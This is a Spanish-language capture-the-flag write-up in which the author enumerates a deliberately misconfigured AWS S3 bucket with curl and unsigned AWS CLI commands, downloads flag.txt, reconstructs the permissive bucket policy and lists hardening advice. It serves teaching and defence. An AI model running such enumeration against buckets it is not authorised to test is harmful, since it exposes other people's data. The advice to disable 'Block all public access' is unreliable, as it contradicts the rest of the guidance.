# CTF Writeup: MediCloudX Public Portal

## Información del Reto

- **Nombre**: MediCloudX Public Portal
- **Puntos**: 419
- **Categoría**: Cloud Security / AWS
- **URL**: http://ctf-25-website-0a466b7c.s3-website-us-east-1.amazonaws.com/

## Descripción

MediCloudX ha lanzado su nuevo portal de información pública para pacientes. La empresa afirma que su infraestructura en la nube es completamente segura y que han implementado las mejores prácticas de AWS.

## Flag

```
CLD[a7b3c9e2-4f8d-4a1b-9c3e-7f2a5d8b6e4c]
```

## Solución

### 1. Reconocimiento Inicial

Al analizar la URL proporcionada, identifiqué que es un sitio web estático alojado en AWS S3:

```
http://ctf-25-website-0a466b7c.s3-website-us-east-1.amazonaws.com/
```

Información clave extraída:
- **Nombre del bucket**: `ctf-25-website-0a466b7c`
- **Región**: `us-east-1`
- **Tipo**: S3 Website Hosting

### 2. Análisis del Sitio Web

Accedí al sitio web y encontré un portal corporativo de telemedicina con:
- Página de información institucional
- Descripción de servicios médicos digitales
- Estadísticas de la plataforma
- Sin funcionalidad interactiva aparente

```bash
curl -s http://ctf-25-website-0a466b7c.s3-website-us-east-1.amazonaws.com/
```

El sitio web muestra solo contenido estático HTML/CSS, sin formularios ni endpoints de API visibles.

### 3. Explotación de S3 Bucket Misconfiguration

#### Vulnerabilidad Identificada

Intenté acceder directamente al bucket S3 usando la API endpoint en lugar del website endpoint:

```bash
curl -s https://ctf-25-website-0a466b7c.s3.amazonaws.com/
```

**Resultado**: El bucket devolvió un XML con el listado completo de archivos, revelando una vulnerabilidad de **configuración insegura de permisos públicos**.

#### Listado de Archivos Encontrados

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>ctf-25-website-0a466b7c</Name>
  <Prefix></Prefix>
  <Marker></Marker>
  <MaxKeys>1000</MaxKeys>
  <IsTruncated>false</IsTruncated>

  <Contents>
    <Key>app-debug.apk</Key>
    <LastModified>2025-11-20T03:06:16.000Z</LastModified>
    <Size>11890856</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>

  <Contents>
    <Key>flag.txt</Key>
    <LastModified>2025-11-17T20:17:50.000Z</LastModified>
    <Size>42</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>

  <Contents>
    <Key>index.html</Key>
    <LastModified>2025-11-17T20:17:50.000Z</LastModified>
    <Size>12198</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
</ListBucketResult>
```

Archivos descubiertos:
- `index.html` (12,198 bytes) - Página principal
- `flag.txt` (42 bytes) - **Archivo objetivo**
- `app-debug.apk` (11.8 MB) - Aplicación Android de debug

### 4. Obtención de la Flag

Con acceso de lectura pública confirmado, descargué el archivo `flag.txt`:

```bash
curl -s https://ctf-25-website-0a466b7c.s3.amazonaws.com/flag.txt
```

**Output**:
```
CLD[a7b3c9e2-4f8d-4a1b-9c3e-7f2a5d8b6e4c]
```

## Vulnerabilidad Técnica

### Descripción

**AWS S3 Bucket con permisos públicos mal configurados**

El bucket S3 tiene habilitadas las siguientes políticas inseguras:

1. **ListBucket Permission**: Permite enumerar todos los objetos del bucket
2. **GetObject Permission**: Permite descargar cualquier objeto públicamente

### Política de Bucket Probable

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadGetObject",
      "Effect": "Allow",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::ctf-25-website-0a466b7c/*",
        "arn:aws:s3:::ctf-25-website-0a466b7c"
      ]
    }
  ]
}
```

### Impacto

- **Exposición de información sensible**: Archivos privados accesibles públicamente
- **Enumeración de recursos**: Descubrimiento de archivos que no deberían ser públicos
- **Fuga de datos**: APK de debug y flag expuestos

## Mejores Prácticas de Seguridad

### Configuración Correcta para S3 Static Website

1. **Usar CloudFront con OAI (Origin Access Identity)**:
   ```
   Usuario → CloudFront → OAI → S3 (privado)
   ```

2. **Bloquear acceso público al bucket**:
   - Deshabilitar "Block all public access"
   - Usar políticas restrictivas

3. **Política de bucket segura** (solo para CloudFront):
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Effect": "Allow",
         "Principal": {
           "AWS": "arn:aws:iam::cloudfront:user/CloudFront Origin Access Identity"
         },
         "Action": "s3:GetObject",
         "Resource": "arn:aws:s3:::bucket-name/*"
       }
     ]
   }
   ```

4. **No almacenar archivos sensibles en buckets públicos**:
   - Separar contenido público y privado
   - Usar buckets diferentes para diferentes niveles de acceso

5. **Auditoría regular**:
   - AWS Trusted Advisor
   - AWS Config Rules
   - S3 Access Analyzer

## Herramientas Utilizadas

- `curl` - Cliente HTTP para peticiones web
- Navegador web - Inspección manual
- Conocimiento de AWS S3 endpoints

## Comandos de Explotación Resumidos

```bash
# 1. Listar contenido del bucket
curl https://ctf-25-website-0a466b7c.s3.amazonaws.com/

# 2. Descargar la flag
curl https://ctf-25-website-0a466b7c.s3.amazonaws.com/flag.txt

# Alternativamente con AWS CLI (si estuviera disponible)
aws s3 ls s3://ctf-25-website-0a466b7c --no-sign-request
aws s3 cp s3://ctf-25-website-0a466b7c/flag.txt . --no-sign-request
```

## Lecciones Aprendidas

1. **Website Endpoint vs API Endpoint**:
   - Website: `http://bucket.s3-website-region.amazonaws.com/` (solo sirve archivos)
   - API: `https://bucket.s3.amazonaws.com/` (permite operaciones S3)

2. **Permisos granulares**:
   - `s3:GetObject` permite leer objetos
   - `s3:ListBucket` permite enumerar el bucket
   - Ambos combinados son especialmente peligrosos

3. **Security by Obscurity no funciona**:
   - Aunque `flag.txt` no está enlazado en el sitio web, es descubrible

4. **Validación de configuraciones de nube**:
   - Siempre revisar permisos antes de deployment
   - Usar herramientas de IaC con validación (Terraform, CloudFormation)

## Referencias

- [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- [AWS S3 Bucket Policies](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-policies.html)
- [OWASP Cloud Security](https://owasp.org/www-project-cloud-security/)

---

**Fecha de resolución**: 20 de noviembre de 2025
**Autor**: CTF Team
